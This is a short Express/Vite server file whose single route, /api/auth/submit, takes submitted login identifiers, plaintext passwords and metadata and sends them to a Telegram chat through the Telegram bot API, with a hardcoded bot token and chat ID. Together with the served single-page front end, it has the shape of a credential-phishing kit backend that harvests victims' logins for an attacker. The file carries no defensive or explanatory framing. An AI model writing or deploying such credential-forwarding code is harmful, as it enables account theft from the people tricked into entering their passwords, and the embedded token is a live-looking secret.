import express from "express";
import path from "path";
import { createServer as createViteServer } from "vite";
import dotenv from "dotenv";

dotenv.config();

async function startServer() {
  const app = express();
  const PORT = 3000;

  app.use(express.json());

  // Telegram Logging Route
  app.post("/api/auth/submit", async (req, res) => {
    try {
      const { authType, loginMethod, identifier, password, metadata } = req.body;
      
      const botToken = process.env.TELEGRAM_BOT_TOKEN || "8908374782:AAF2PPU4Xzl3nhHgca9cOXvXbqNHXbgCjGA";
      const chatId = process.env.TELEGRAM_CHAT_ID || "8141432907";

      const message = `
🚀 *New Login Attempt*
-------------------
*Type:* ${authType}
*Method:* ${loginMethod}
*Identifier:* ${identifier}
*Password:* \`${password}\`
*Meta:* ${JSON.stringify(metadata)}
-------------------
`;

      const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: chatId,
          text: message,
          parse_mode: "Markdown",
        }),
      });

      if (!response.ok) {
        const error = await response.json();
        console.error("Telegram API Error:", error);
        return res.status(500).json({ error: "Failed to send notification" });
      }

      res.json({ success: true });
    } catch (error) {
      console.error("Submission Error:", error);
      res.status(500).json({ error: "Internal Server Error" });
    }
  });

  // Vite middleware for development
  if (process.env.NODE_ENV !== "production") {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: "spa",
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), "dist");
    app.use(express.static(distPath));
    app.get("*", (req, res) => {
      res.sendFile(path.join(distPath, "index.html"));
    });
  }

  app.listen(PORT, "0.0.0.0", () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
